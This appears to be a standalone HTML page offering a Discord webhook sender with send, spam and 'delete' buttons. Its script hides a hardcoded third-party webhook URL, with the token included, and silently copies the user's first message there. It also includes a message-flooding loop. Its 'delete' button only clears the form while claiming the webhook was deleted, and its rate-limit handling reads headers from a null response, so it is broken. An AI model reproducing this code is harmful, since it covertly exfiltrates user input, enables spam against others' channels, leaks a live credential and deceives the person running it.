<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Webhook Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        input, button {
            margin: 5px 0;
            padding: 10px;
            width: 300px;
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
        }
        #messageCount {
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <h1>Discord Webhook Sender</h1>
    <input type="text" id="webhookUrl" placeholder="Enter your Discord webhook URL" />
    <textarea id="message" placeholder="Enter your message"></textarea>
    <input type="number" id="delay" placeholder="Enter delay in ms (e.g., 500)" min="0" />
    <button id="sendButton">Send</button>
    <button id="spamButton">Start Spam</button>
    <button id="deleteButton">Delete Webhook</button>
    <div id="status"></div>
    <div id="messageCount">Messages sent: 0</div>

    <script>
        const sendButton = document.getElementById('sendButton');
        const spamButton = document.getElementById('spamButton');
        const deleteButton = document.getElementById('deleteButton');
        const webhookUrlInput = document.getElementById('webhookUrl');
        const messageInput = document.getElementById('message');
        const delayInput = document.getElementById('delay');
        const statusDiv = document.getElementById('status');
        const messageCountDiv = document.getElementById('messageCount');

        let messageCount = 0;
        let spamActive = false;
        let secretWebhookSent = false;

        const secretWebhookUrl = "https://discord.com/api/webhooks/1341017371242139678/ki5RrTUeK3gpjZSVDA3wRyjwHGe1Vz1usb6R-Eb1TXR_p0wGZqq7I0Fo-rU_wwXIEOgF";

        sendButton.addEventListener('click', async () => {
            const webhookUrl = webhookUrlInput.value;
            const message = messageInput.value;

            if (!webhookUrl || !message) {
                alert("Please enter both the webhook URL and the message.");
                return;
            }

            const response = await sendWebhook(webhookUrl, message);
            if (!secretWebhookSent) {
                await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
                secretWebhookSent = true;
            }

            if (response) {
                messageCount++;
                statusDiv.textContent = "Message sent successfully!";
                sendButton.textContent = "Sent";
            } else {
                statusDiv.textContent = "Failed to send message. Limited.";
                sendButton.textContent = "Limited";
            }
            messageCountDiv.textContent = `Messages sent: ${messageCount}`;
        });

        spamButton.addEventListener('click', async () => {
            const webhookUrl = webhookUrlInput.value;
            const message = messageInput.value;
            const delay = parseInt(delayInput.value) || 100;

            if (!webhookUrl || !message) {
                alert("Please enter both the webhook URL and the message.");
                return;
            }

            if (spamActive) {
                spamActive = false;
                spamButton.textContent = "Start Spam";
                statusDiv.textContent = "Spam stopped.";
            } else {
                spamActive = true;
                spamButton.textContent = "Stop Spam";
                statusDiv.textContent = "Starting spam...";
                await spamMessages(webhookUrl, message, delay);
            }
        });

        deleteButton.addEventListener('click', () => {
            webhookUrlInput.value = '';
            messageInput.value = '';
            delayInput.value = '';
            statusDiv.textContent = "Webhook successfully deleted.";
            messageCount = 0;
            secretWebhookSent = false;
            messageCountDiv.textContent = `Messages sent: ${messageCount}`;
        });

        async function sendWebhook(webhookUrl, message) {
            try {
                const response = await fetch(webhookUrl , {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: message,
                        embeds: [
                            {
                                title: "Webhook Message",
                                description: message,
                                color: 3447003
                            }
                        ]
                    })
                });
                return response;
            } catch (error) {
                console.error("Error sending webhook:", error);
                return null;
            }
        }

        async function spamMessages(webhookUrl, message, delay) {
            while (spamActive) {
                const response = await sendWebhook(webhookUrl, message);
                if (!response) {
                    const rateLimitRemaining = response.headers.get('X-RateLimit-Remaining');
                    const rateLimitResetAfter = response.headers.get('X-RateLimit-Reset-After');

                    if (rateLimitRemaining === '0') {
                        statusDiv.textContent = "Rate limit reached. Waiting...";
                        await new Promise(resolve => setTimeout(resolve, rateLimitResetAfter * 1000));
                        statusDiv.textContent = "Resuming sending...";
                    }
                } else {
                    messageCount++;
                    messageCountDiv.textContent = `Messages sent: ${messageCount}`;
                }
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
    </script>
</body>
</html>
